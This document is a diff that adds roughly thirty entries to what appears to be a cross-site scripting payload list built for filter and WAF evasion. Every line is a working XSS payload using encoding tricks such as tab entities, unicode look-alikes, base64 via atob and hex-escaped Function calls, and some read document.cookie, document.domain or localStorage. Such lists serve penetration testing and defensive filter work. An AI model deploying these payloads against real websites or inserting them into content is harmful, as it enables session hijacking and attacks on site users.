@@ -96,3 +96,32 @@ frames['alert'](document["cookie"])
 <input type="checkbox" id="z" value="xss0r" style="display:none" &%2362;="" onchange="top[['alert'][0]](location.hostname);this.remove()"><label for="z" style="position:fixed;inset:0;cursor:crosshair"></label>
 '"--><svg/onload=top[30]()>${{4*9}}<script>+alert?.``</script>
 '"><img/src/onerror=prompt()>java%26Tab%3bscript:ale%26Tab%3brt()<iframe src=javascript:alert()//<s<script>cript>alert()</s<script>cript>
+<base href="alert(1)" onfocus="a = /\/([^/]+)$/.exec(baseURI); eval(a[1]);" tabindex=1 style="display:block" autofocus></base>
+<img%20hrEF="x"%20sRC="data:x,"%20oNLy=1%20oNErrOR=prompt1>
+<img+src=oNlY=1+ onerror="alert(['a', 'x', 'b', 'x', 'c', 's'].map(c => c.replace(/[abc]/g, '')).join(''))">
+<img+src=oNlY=1+ onerror="alert(['x', String.fromCharCode(121), 'x', 's'].filter(c => c.charCodeAt(0) !== 121).join(''))">
+%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
+<img/src/onerror=setTimeout(atob(/YWxlcnQoMTMzNyk/.source))>
+<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">
+?foobar=<foo%20bar=%250a%20onclick=<your js code>
+?utm_source=abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e
+<a+HREF="%26%237 javascrip%26%239t: alert%261par;document .domain) *>
+â€/>&_lt;_script>alert(1)&_lt;/scr_ipt>â€/>
+<a href=[â€‹]"â€‹ onmouseover=prompt(1)//">XYZ</a>
+<script //>//confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')//</script //
+<blink/onmouseover=prompt(1)>OnMouseOver {Firefox & Opera}
+<svg> <foreignObject width="100%" height="100%"> <body> <iframe src='javascript:confirm(10)'></iframe> </body> </foreignObject> </svg>
+<script>var a=document.createElement("a");a.href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==";http://a.click();</script>
+jaVasCript:/--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[/[]/+alert(1)//'>
+<svg%0Aonauxclick=0;[1].some(confirm)//
+<svg onload=alert%26%230000000040"")>
+<a/href=j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(1)&rpar;>
+<svg onx=() onload=(confirm)(1)>
+<svg onx=() onload=(confirm)(document.cookie)>
+<svg onx=() onload=(confirm)(JSON.stringify(localStorage))>
+Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();
+"><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;
+Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();
+"><onx=[] onmouseover=prompt(1)>
+&#60;body onload=alert('Abhishek_Dirisipo')&#62;&#34;&#34;
+confirm?.(1)
